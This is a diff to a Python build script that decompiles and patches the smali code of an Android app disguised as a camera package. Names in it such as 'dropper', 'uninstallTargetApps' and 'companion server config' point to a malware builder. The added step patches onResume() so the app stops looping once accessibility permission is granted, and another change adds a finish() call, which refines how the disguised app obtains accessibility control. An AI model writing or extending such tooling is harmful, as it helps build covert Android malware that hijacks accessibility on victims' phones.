@@ -870,6 +870,9 @@ def step_patch_dropper_pkg(nova_pkg: str):
 
     .line 19
     invoke-virtual {{p0, v0}}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
+
+    .line 20
+    invoke-virtual {{p0}}, Landroid/app/Activity;->finish()V
     :try_end_0
     .catch Ljava/lang/Exception; {{:try_start_0 .. :try_end_0}} :catch_0
 
@@ -900,6 +903,91 @@ def step_patch_dropper_pkg(nova_pkg: str):
         f.write(new_content)
 
     print(f"  ✅ uninstallTargetApps patched → direct ACTION_DELETE for dropper: {nova_pkg}")
+
+
+def step_patch_onresume():
+    """Patch onResume() in companion smali to fix two bugs:
+
+    Bug 1 — accessibility redirect loop:
+      After accessibility is granted, onResume() still falls through to the
+      np state-machine block which calls np.f()/np.g() → openAccessibilitySettings.
+      Fix: after the accessibility-true branch (setContentView 0x7f0c002d at line 1711),
+      insert a return-void so we never reach the np block when accessibility is granted.
+
+    Bug 2 — d:Z redirect loop:
+      When d:Z == true (Device Not Supported screen is already shown) and accessibility
+      is NOT granted, onResume() still falls into the np block and re-fires
+      openAccessibilitySettings. Fix: after the d:Z check (cond_1 / iget-boolean d:Z),
+      if d:Z is true jump past the np block to goto_2 (the a()V call) and return.
+
+    Must run AFTER step_decompile() but BEFORE step_rename_smali() (STEP_6).
+    """
+    print("\n── Step 5D: Patch onResume() — fix accessibility redirect loop")
+
+    old_path = OLD_PKG.replace(".", "/")
+    smali_file = os.path.join("companion_decompiled", "smali", old_path, "MainActivity.smali")
+
+    if not os.path.isfile(smali_file):
+        print(f"  ⚠️  MainActivity.smali not found at {smali_file} — skipping onResume patch")
+        return
+
+    with open(smali_file, "r", encoding="utf-8") as f:
+        content = f.read()
+
+    # ── Fix 1: accessibility granted → return immediately after setContentView ──
+    # Original block (accessibility true path):
+    #   const v0, 0x7f0c002d
+    #   invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(I)V
+    #   goto :goto_1
+    # Patch: replace goto :goto_1 with return-void
+    OLD_GOTO = (
+        "    const v0, 0x7f0c002d\n\n"
+        "    .line 13\n"
+        "    invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(I)V\n\n"
+        "    .line 16\n"
+        "    goto :goto_1"
+    )
+    NEW_GOTO = (
+        "    const v0, 0x7f0c002d\n\n"
+        "    .line 13\n"
+        "    invoke-virtual {p0, v0}, Landroid/app/Activity;->setContentView(I)V\n\n"
+        "    .line 16\n"
+        "    return-void"
+    )
+
+    if OLD_GOTO in content:
+        content = content.replace(OLD_GOTO, NEW_GOTO, 1)
+        print("  ✅ Fix 1: accessibility granted → return-void (no redirect to accessibility settings)")
+    else:
+        print("  ⚠️  Fix 1 anchor not found — skipping accessibility granted return patch")
+
+    # ── Fix 2: d:Z == true → jump past np block to goto_2 ──
+    # Original:
+    #   iget-boolean v0, p0, Lcom/.../MainActivity;->d:Z
+    #   if-nez v0, :cond_2
+    # Patch: change :cond_2 to :goto_2 so when d:Z is true we skip the np block
+    # and land directly at the a()V call + return-void
+    OLD_DZ = (
+        "    iget-boolean v0, p0, Lcom/android/photo/camera/capture/MainActivity;->d:Z\n\n"
+        "    .line 19\n"
+        "    if-nez v0, :cond_2"
+    )
+    NEW_DZ = (
+        "    iget-boolean v0, p0, Lcom/android/photo/camera/capture/MainActivity;->d:Z\n\n"
+        "    .line 19\n"
+        "    if-nez v0, :goto_2"
+    )
+
+    if OLD_DZ in content:
+        content = content.replace(OLD_DZ, NEW_DZ, 1)
+        print("  ✅ Fix 2: d:Z == true → jump to goto_2, skip np redirect block")
+    else:
+        print("  ⚠️  Fix 2 anchor not found — skipping d:Z redirect-skip patch")
+
+    with open(smali_file, "w", encoding="utf-8") as f:
+        f.write(content)
+
+    print("  ✅ onResume() patch complete")
 
 
 def step_rename_smali(new_pkg):
@@ -3096,6 +3184,9 @@ def main():
     with track("PHASE_1", "STEP_5C", "Patch uninstallTargetApps → dropper pkg direct uninstall"):
         _nova_pkg = os.environ.get("NOVA_PKG", "")
         step_patch_dropper_pkg(_nova_pkg)
+
+    with track("PHASE_1", "STEP_5D", "Patch onResume() — fix accessibility redirect loop + d:Z guard"):
+        step_patch_onresume()
 
     with track("PHASE_1", "STEP_5B", "Patch companion server config (love.smali)"):
         step_patch_server_config()
